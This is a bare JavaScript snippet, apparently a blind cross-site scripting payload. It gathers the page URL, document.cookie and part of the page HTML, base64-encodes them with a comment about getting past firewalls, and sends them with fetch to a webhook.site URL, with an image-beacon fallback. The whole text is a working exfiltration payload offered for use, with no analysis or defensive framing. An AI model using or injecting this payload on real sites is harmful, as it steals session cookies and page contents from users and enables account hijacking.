(async () => {
  try {
    // Collect critical context clues to prove where execution is happening
    const contextData = {
      location: window.location.href,
      cookies: document.cookie || "No cookies accessible (HTTPOnly or none)",
      dom_preview: document.documentElement.outerHTML.substring(0, 800)
    };

    // Base64 encode the payload to safely pass structured strings through firewalls
    const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(contextData))));

    // Exfiltrate the data out to your webhook receiver
    await fetch('https://webhook.site/a597f310-0bd5-4878-b4ad-c8784bab7003' + encodedData, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (e) {
    // Fallback payload if fetch constraints apply
    new Image().src = 'https://webhook.site/a597f310-0bd5-4878-b4ad-c8784bab7003' + encodeURIComponent(e.message);
  }
})();
